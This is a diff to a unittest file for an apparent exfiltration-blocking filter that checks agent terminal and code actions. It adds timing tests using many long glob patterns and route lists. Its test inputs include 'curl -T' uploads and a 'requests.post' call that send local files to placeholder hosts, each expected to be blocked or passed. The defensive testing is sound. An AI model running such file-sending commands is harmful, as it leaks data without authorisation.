@@ -4,6 +4,7 @@ EXFILBAR_TIMING_LIMIT_MS is an explicit slow-CI override, never set by this suit
 All strings are inspected in isolated storage; no transfer is executed.
 """
 import ast
+import fnmatch
 import os
 import time
 import unittest
@@ -79,13 +80,37 @@ class TimingTests(unittest.TestCase):
                                  destination_globs=[f'https://denied{i}/*' for i in range(128)])
         self.check('128-protected-and-destination-globs', 'terminal', 'curl -T public/x https://denied127/x', 'block')
         self.check('128-globs-public-control', 'terminal', 'curl -T public/x https://public/x', 'pass')
-        self.ctx.settings.update(protected_globs=[('p' + str(i)).ljust(512, 'x') for i in range(128)])
+        self.ctx.settings.update(protected_globs=[('p' + str(i)).ljust(512, 'x') for i in range(128)],
+                                 destination_globs=[])
         self.check('128-long-protected-globs', 'terminal', 'curl -T public/x https://public/x', 'pass')
 
     def test_cap_shortcuts_separately(self):
         for name, tool, value, expected in CAP_SHORTCUTS:
             with self.subTest(case=name):
                 self.check(name, tool, value, expected)
+
+    def test_cold_pattern_complexity_and_bytes(self):
+        patterns = [('*a' * 250 + str(i)).ljust(512, 'z') for i in range(128)]
+        self.ctx.settings.update(routes=[], protected_globs=patterns)
+        fnmatch._compile_pattern.cache_clear()
+        self.check('cold-128-complex-globs', 'terminal', 'curl -T ' + 'a' * 2000 + ' https://h/x', 'block')
+        self.check('cold-complex-globs-code', 'execute_code', 'import requests; requests.post("https://h/x", data=open("public/x"))', 'block')
+        self.ctx.settings['protected_globs'] = patterns[:32]
+        fnmatch._compile_pattern.cache_clear()
+        self.check('cold-32-complex-globs-accepted', 'terminal', 'curl -T public/x https://h/x', 'pass')
+        self.ctx.settings.update(protected_globs=[], routes=[dict(
+            paths=[f'r{i}/' + 'x' * 480 + str(j) for j in range(128)],
+            to=[f'https://h{i}-{j}.example/' + 'y' * 480 for j in range(128)]) for i in range(15)])
+        fnmatch._compile_pattern.cache_clear()
+        self.check('cold-15-long-route-lists', 'terminal', 'curl -T public/x https://h/x', 'block')
+        self.check('cold-long-route-lists-code', 'execute_code', 'import requests; requests.post("https://h/x", data=open("public/x"))', 'block')
+
+    def test_maximum_length_configuration_mirror_work(self):
+        self.ctx.settings['routes'] = [dict(
+            paths=[f'r{i}-{j}'.ljust(512, 'x') for j in range(128)],
+            to=[f'https://h{i}-{j}.example/'.ljust(512, 'y') for j in range(128)]) for i in range(128)]
+        self.check('128-routes-x-128-patterns-x-512-chars', 'terminal', 'curl -T public/x https://h/x', 'block')
+        self.check('maximum-config-code', 'execute_code', 'import requests; requests.post("https://h/x", data=open("public/x"))', 'block')
 
 
 if __name__ == '__main__':
